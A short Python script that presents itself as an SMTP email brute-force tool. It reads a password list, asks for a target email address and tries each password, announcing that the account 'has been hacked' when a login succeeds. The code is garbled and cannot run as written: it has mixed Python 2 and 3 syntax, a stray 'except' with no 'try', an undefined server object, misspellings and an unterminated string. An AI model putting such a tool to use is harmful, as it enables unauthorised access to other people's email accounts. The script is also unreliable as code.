#!/usr/bin/python
"'coded by khalilurahmanhussaini'"
import smtplib
from os import system
def main():
    print("==========================================")
    print("    coded by khalilurahmanhussaini")
    print("==========================================")
    print("    ++++++++++++++++++++++++++++++++")
    print("i\n                  " )
    
main()
print("[1] start the brute force attacks")
print("[2] exit")
option = input('==>')
if option == 1:
    file_path = raw_input('enter the path of password file')

else:
    system('clear')
    exit()

pass_file = open(file_path,'r')
pass_list = pass_file.readlines()

def login():
    i = 0
    user_name = raw_input('enter the target email:')
    server.ehlo()
    for password in pass_list:
        i = i + 1
        print( str(i) + '/' +str(len(pass_list))
        server(.login(user_name,password))
        system('clear')
        

main()
print '\'
print'(+) this account has been hacked,password:' + passaword +'  ^_^'

except smtplib.SMTAuthenticationERROR as e:
    error = str(e)
    if error(14) == '<':
        system('clear')
        main()
        print'(+) this account has been hacked,password :'+ password +' ^_^
        break
    else:
        print'(!) pssaword not found =>'+password


login()




